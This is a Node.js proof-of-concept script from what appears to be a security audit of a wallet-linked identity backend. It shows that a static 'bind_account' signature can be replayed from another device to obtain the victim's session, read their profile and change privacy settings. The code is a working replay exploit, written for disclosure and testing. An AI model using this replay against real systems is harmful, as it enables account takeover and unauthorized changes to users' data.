// PoC for FIND-01 (proof/SECURITY_PROOF.md).
//
// The `bind_account` proof is a static message — no nonce, timestamp, chainId or verifyingContract
// — so one captured signature grants a Prism session for that account forever. This demonstrates
// the authorization gap, not fund theft: spending still requires a fresh Mera signature.
//
// Run:  cd proof/poc && node bind-replay.mjs     (needs `npm install` in backend/ first)
// viem is imported by path because this script lives outside the backend package.
import fs from 'node:fs'; import os from 'node:os'; import path from 'node:path';
process.env.MONAD_CHAIN_ID='10143';
const B='../../backend/src';
const { config } = await import(`${B}/config.js`);
const { JsonStore } = await import(`${B}/lib/jsonStore.js`);
const { IdentityService } = await import(`${B}/services/identityService.js`);
const { issueSession, verifySession, canonicalJson } = await import(`${B}/lib/crypto.js`);
const { privateKeyToAccount } = await import('../../backend/node_modules/viem/_esm/accounts/index.js');

const store = new JsonStore(path.join(fs.mkdtempSync(path.join(os.tmpdir(),'poc-')),'store.json'));
const identityService = new IdentityService({ store, config });
const victim = privateKeyToAccount(`0x${'11'.repeat(32)}`);

// 1. Victim onboards normally. This is the ONLY signature they ever produce for binding.
const payload = canonicalJson({ action: 'bind_account', account: victim.address.toLowerCase() });
const bindingProof = await victim.signMessage({ message: payload });
const real = await identityService.upsertVerifiedPhone({
  phone: '+2348031234567', account: victim.address, bindingProof
});
console.log('victim prismId      :', real.prismId);
console.log('signed payload      :', payload);
console.log('  -> note: no nonce, no timestamp, no chainId, no verifyingContract');

// 2. Attacker replays that exact signature later, from another device.
const stolen = await identityService.createDeviceIdentity({ account: victim.address, bindingProof });
const attackerSession = issueSession({ prismId: stolen.prismId }, config.sessionSecret);
console.log('attacker got prismId:', stolen.prismId, '(same identity:', stolen.prismId === real.prismId, ')');
console.log('attacker session ok :', verifySession(attackerSession, config.sessionSecret).prismId === real.prismId);

// 3. What that session exposes.
const view = identityService.publicView(identityService.get(stolen.prismId));
console.log('readable as victim  :', JSON.stringify({ phoneMasked: view.phoneMasked, account: view.account, handle: view.handle }));
const flipped = identityService.setPrivacy(stolen.prismId, { phoneDiscoverable: false });
console.log('mutable w/o acct sig:', 'phoneDiscoverable ->', flipped.phoneDiscoverable);
